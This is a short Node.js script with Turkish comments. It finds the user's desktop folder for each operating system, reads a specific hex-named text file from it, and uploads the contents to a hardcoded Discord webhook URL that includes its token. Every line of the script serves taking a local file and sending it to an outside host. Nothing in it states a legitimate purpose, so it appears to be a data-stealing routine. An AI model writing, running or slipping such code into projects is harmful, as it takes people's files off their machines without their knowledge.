const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');

// Webhook URL'si
const webhookUrl = 'https://discordapp.com/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl';

// İşletim sistemi tespiti
const platform = os.platform();

// İşletim sistemi bazında dosya yolu belirleme
let desktopPath;
if (platform === 'win32') {
  desktopPath = path.join(os.homedir(), 'Desktop');
} else if (platform === 'darwin') {
  desktopPath = path.join(os.homedir(), 'Desktop');
} else if (platform === 'linux') {
  desktopPath = path.join(os.homedir(), 'Masaüstü');
} else {
  console.error('Desteklenmeyen işletim sistemi:', platform);
  return;
}

// Dosya yolunu ve adını oluştur
const filePath = path.join(desktopPath, '9AA6E459D7B29E77BEEC69E1F5F2C6C3.txt');

// Dosyayı oku
fs.readFile(filePath, (err, fileData) => {
  if (err) {
    console.error('Dosya okunurken bir hata oluştu:', err);
    return;
  }

  // Webhook'a POST isteği gönder
  const postData = fileData;

  // POST isteği için gerekli seçenekler
  const options = {
    hostname: 'discordapp.com',
    path: '/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl',
    method: 'POST',
    headers: {
      'Content-Type': 'application/octet-stream',
      'Content-Disposition': `attachment; filename="${path.basename(filePath)}"`
    }
  };

  // Webhook'a POST isteği gönder
  const req = https.request(options, res => {
    console.log(`Webhook isteği gönderildi, yanıt kodu: ${res.statusCode}`);
  });

  req.on('error', error => {
    console.error('Webhook isteği gönderilirken bir hata oluştu:', error.message);
  });

  req.write(postData);
  req.end();
});
